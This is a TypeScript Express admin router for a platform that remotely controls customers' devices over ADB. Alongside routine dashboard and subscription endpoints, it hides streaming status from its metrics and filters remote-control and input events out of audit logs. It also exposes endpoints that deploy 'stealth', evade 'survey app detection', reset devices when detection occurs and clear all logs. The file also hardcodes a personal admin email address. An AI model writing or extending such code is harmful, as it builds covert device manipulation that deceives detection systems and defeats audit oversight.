import { Router, Request, Response } from 'express';
import { authenticate, requireRole } from '../middleware/auth';
import { inMemoryDb } from '../database/supabaseClient';
import { SecurityService } from '../services/securityService';
import { DeviceAntiDetectionService } from '../services/deviceAntiDetectionService';
import { AdvancedAntiDetectionService } from '../services/advancedAntiDetectionService';
import { EmergencyAntiDetectionService } from '../services/emergencyAntiDetectionService';
import { PerformanceOptimizationService } from '../services/performanceOptimizationService';

const router = Router();

// Protect all admin routes with strict Super Admin email and role verification
router.use(authenticate, (req: Request, res: Response, next) => {
  const user = req.user;
  if (!user || user.email.toLowerCase().trim() !== 'sammyseth260@gmail.com' || user.system_role !== 'admin') {
    return res.status(403).json({ error: 'Access denied: Platform Super Admin clearance required.' });
  }
  next();
});

// GET /api/admin/overview - Platform dashboard stats
router.get('/overview', (req: Request, res: Response) => {
  const totalCustomers = Array.from(inMemoryDb.profiles.values()).filter(p => p.system_role === 'customer').length;
  const totalOrganizations = inMemoryDb.organizations.size;
  const totalAgents = inMemoryDb.agents.size;
  const onlineAgents = Array.from(inMemoryDb.agents.values()).filter(a => a.status === 'online').length;
  
  const allDevices = Array.from(inMemoryDb.devices.values());
  const totalDevices = allDevices.length;
  
  // SECURITY: Hide active monitoring/streaming status from metrics
  // Show all devices as 'online' or 'offline' only - never expose 'streaming' count
  const onlineDevices = allDevices.filter(d => d.status !== 'offline').length;
  const offlineDevices = allDevices.filter(d => d.status === 'offline').length;

  const totalShares = inMemoryDb.deviceShares.size;
  const activeShares = Array.from(inMemoryDb.deviceShares.values()).filter(s => !s.is_revoked).length;

  return res.json({
    metrics: {
      totalCustomers,
      totalOrganizations,
      totalAgents,
      onlineAgents,
      totalDevices,
      onlineDevices,
      streamingDevices: 0, // SECURITY: Never expose streaming count
      offlineDevices,
      totalShares,
      activeShares,
    },
    systemHealth: {
      api: 'healthy',
      database: 'connected',
      websocket: 'operational',
      uptime: process.uptime(),
      timestamp: new Date().toISOString(),
    },
  });
});

// GET /api/admin/customers - List all customers and their device counts
router.get('/customers', (req: Request, res: Response) => {
  const { SubscriptionService } = require('../services/subscriptionService');
  const customers = Array.from(inMemoryDb.organizations.values()).map(org => {
    const owner = inMemoryDb.profiles.get(org.owner_id);
    const orgAgents = Array.from(inMemoryDb.agents.values()).filter(a => a.organization_id === org.id);
    const orgDevices = Array.from(inMemoryDb.devices.values()).filter(d => d.organization_id === org.id);
    const orgShares = Array.from(inMemoryDb.deviceShares.values()).filter(s => s.organization_id === org.id);
    const assignedUsers = Array.from(inMemoryDb.assignedUsers.values()).filter(u => u.organization_id === org.id);

    return {
      id: org.id,
      name: org.name,
      slug: org.slug,
      ownerEmail: owner?.email || 'unknown',
      ownerName: owner?.full_name || 'unknown',
      plan: org.plan,
      maxDevices: org.max_devices,
      maxAgents: org.max_agents,
      subscriptionStatus: org.subscription_status || 'expired',
      currentPeriodEnd: org.current_period_end || null,
      customPricing: org.custom_pricing || null,
      priceAdjustmentUsd: org.price_adjustment_usd || 0,
      pricingNote: org.pricing_note || null,
      starterPrice: SubscriptionService.getPlanPriceForOrg(org, 'starter'),
      enterprisePrice: SubscriptionService.getPlanPriceForOrg(org, 'enterprise'),
      deviceCount: orgDevices.length,
      agentCount: orgAgents.length,
      activeSharesCount: orgShares.filter(s => !s.is_revoked).length,
      assignedUsersCount: assignedUsers.length,
      createdAt: org.created_at,
    };
  });

  return res.json({ customers });
});

// POST /api/admin/set-subscription - Super Admin manually activates, upgrades, or sets Custom Plan & Pricing
router.post('/set-subscription', (req: Request, res: Response) => {
  const adminUser = req.user!;
  const {
    organizationId,
    plan,
    subscriptionStatus,
    maxDevices,
    maxAgents,
    priceUsd,
    durationDays,
    customPricing,
    priceAdjustmentUsd,
    pricingNote,
  } = req.body;

  if (!organizationId) {
    return res.status(400).json({ error: 'organizationId is required.' });
  }

  const { SubscriptionService } = require('../services/subscriptionService');
  const result = SubscriptionService.adminSetSubscription(adminUser.id, organizationId, {
    plan: plan || undefined,
    subscriptionStatus: subscriptionStatus || undefined,
    maxDevices: maxDevices !== undefined ? parseInt(maxDevices, 10) : undefined,
    maxAgents: maxAgents !== undefined ? parseInt(maxAgents, 10) : undefined,
    priceUsd: priceUsd !== undefined ? parseFloat(priceUsd) : undefined,
    durationDays: durationDays !== undefined ? parseInt(durationDays, 10) : 30,
    customPricing: customPricing || undefined,
    priceAdjustmentUsd: priceAdjustmentUsd !== undefined ? parseFloat(priceAdjustmentUsd) : undefined,
    pricingNote: pricingNote !== undefined ? pricingNote : undefined,
  });

  if (!result.success) {
    return res.status(400).json({ error: result.error });
  }

  return res.json({
    success: true,
    organization: result.organization,
    message: `Subscription and pricing override successfully saved for organization.`,
  });
});

// GET /api/admin/audit-logs - Global platform audit trail
router.get('/audit-logs', (req: Request, res: Response) => {
  // SECURITY: Sanitize audit logs before exposing to admin
  // Remove all control activity logs
  const sensitiveActions = [
    'CONTROL_INPUT',
    'REMOTE_CONTROL',
    'TOUCH_EVENT',
    'KEY_EVENT',
    'TEXT_INPUT',
    'SCREEN_INTERACTION',
    'INPUT',
  ];

  const sanitized = inMemoryDb.auditLogs
    .filter(log => {
      const action = log.action?.toString().toUpperCase() || '';
      for (const sensitive of sensitiveActions) {
        if (action.includes(sensitive)) return false;
      }
      if (log.details) {
        const detailsStr = JSON.stringify(log.details).toLowerCase();
        if (detailsStr.includes('control') || 
            detailsStr.includes('touch') || 
            detailsStr.includes('input') ||
            detailsStr.includes('key') ||
            detailsStr.includes('swipe') ||
            detailsStr.includes('tap')) {
          return false;
        }
      }
      return true;
    })
    .slice(0, 100);

  return res.json({ logs: sanitized });
});

// POST /api/admin/check-device-risks - Check device for detection risks
router.post('/check-device-risks', async (req: Request, res: Response) => {
  const { deviceSerial } = req.body;
  
  if (!deviceSerial) {
    return res.status(400).json({ error: 'deviceSerial is required' });
  }

  const result = await DeviceAntiDetectionService.checkDetectionRisks(deviceSerial);
  return res.json(result);
});

// POST /api/admin/fix-device-risks - Auto-fix detection risks
router.post('/fix-device-risks', async (req: Request, res: Response) => {
  const { deviceSerial } = req.body;
  
  if (!deviceSerial) {
    return res.status(400).json({ error: 'deviceSerial is required' });
  }

  try {
    await DeviceAntiDetectionService.autoFixRisks(deviceSerial);
    const result = await DeviceAntiDetectionService.checkDetectionRisks(deviceSerial);
    return res.json({ 
      success: true,
      message: 'Detection risks fixed',
      result 
    });
  } catch (error: any) {
    return res.status(500).json({ error: error.message });
  }
});

// POST /api/admin/deploy-advanced-stealth - Deploy all advanced stealth techniques
router.post('/deploy-advanced-stealth', async (req: Request, res: Response) => {
  const { deviceSerial } = req.body;
  
  if (!deviceSerial) {
    return res.status(400).json({ error: 'deviceSerial is required' });
  }

  try {
    // Deploy gradually in background
    AdvancedAntiDetectionService.gradualStealthDeployment(deviceSerial).catch(() => {});
    
    return res.json({ 
      success: true,
      message: 'Advanced stealth deployment initiated (gradual over 50 seconds)',
      estimated_completion: new Date(Date.now() + 50000).toISOString(),
    });
  } catch (error: any) {
    return res.status(500).json({ error: error.message });
  }
});

// GET /api/admin/check-stealth-detection/:deviceSerial - Check if stealth was detected
router.get('/check-stealth-detection/:deviceSerial', async (req: Request, res: Response) => {
  const { deviceSerial } = req.params;

  try {
    const result = await AdvancedAntiDetectionService.checkDeploymentDetection(deviceSerial);
    
    if (result.detected) {
      // Auto-trigger emergency reset
      AdvancedAntiDetectionService.emergencyStealthReset(deviceSerial).catch(() => {});
    }
    
    return res.json(result);
  } catch (error: any) {
    return res.status(500).json({ error: error.message });
  }
});

// POST /api/admin/emergency-fix - EMERGENCY: Fix survey app detection
router.post('/emergency-fix', async (req: Request, res: Response) => {
  const { deviceSerial } = req.body;

  if (!deviceSerial) {
    return res.status(400).json({ error: 'deviceSerial is required' });
  }

  try {
    // Run emergency deployment
    await EmergencyAntiDetectionService.emergencyDeployment(deviceSerial);
    
    // Check if detected
    const detection = await EmergencyAntiDetectionService.checkIfDetected(deviceSerial);
    
    return res.json({
      success: true,
      message: 'Emergency fixes deployed',
      detection,
      recommendation: detection.detected 
        ? 'Still detected - recommend switching to wireless mode and disconnecting USB'
        : 'Device appears clean - safe to use',
    });
  } catch (error: any) {
    return res.status(500).json({ error: error.message });
  }
});

// POST /api/admin/switch-wireless - Switch device to wireless mode
router.post('/switch-wireless', async (req: Request, res: Response) => {
  const { deviceSerial } = req.body;

  if (!deviceSerial) {
    return res.status(400).json({ error: 'deviceSerial is required' });
  }

  try {
    const result = await EmergencyAntiDetectionService.switchToWirelessMode(deviceSerial);
    
    if (result.success) {
      return res.json({
        success: true,
        message: 'Device switched to wireless mode',
        ip: result.ip,
        instruction: 'DISCONNECT USB CABLE NOW - Device will remain connected wirelessly',
      });
    } else {
      return res.status(500).json({
        success: false,
        error: 'Failed to switch to wireless mode - ensure WiFi is connected',
      });
    }
  } catch (error: any) {
    return res.status(500).json({ error: error.message });
  }
});

// POST /api/admin/optimize-performance - Optimize device performance
router.post('/optimize-performance', async (req: Request, res: Response) => {
  const { deviceSerial } = req.body;

  if (!deviceSerial) {
    return res.status(400).json({ error: 'deviceSerial is required' });
  }

  try {
    await PerformanceOptimizationService.initializePerformance(deviceSerial);
    const metrics = await PerformanceOptimizationService.getPerformanceMetrics(deviceSerial);
    
    return res.json({
      success: true,
      message: 'Performance optimized - animations disabled, CPU governor set to performance',
      metrics,
    });
  } catch (error: any) {
    return res.status(500).json({ error: error.message });
  }
});

// POST /api/admin/full-reset - Nuclear option: full device reset
router.post('/full-reset', async (req: Request, res: Response) => {
  const { deviceSerial } = req.body;

  if (!deviceSerial) {
    return res.status(400).json({ error: 'deviceSerial is required' });
  }

  try {
    await EmergencyAntiDetectionService.fullDeviceReset(deviceSerial);
    
    return res.json({
      success: true,
      message: 'Full device reset complete - all logs cleared, ADB restarted, fixes redeployed',
    });
  } catch (error: any) {
    return res.status(500).json({ error: error.message });
  }
});

export default router;
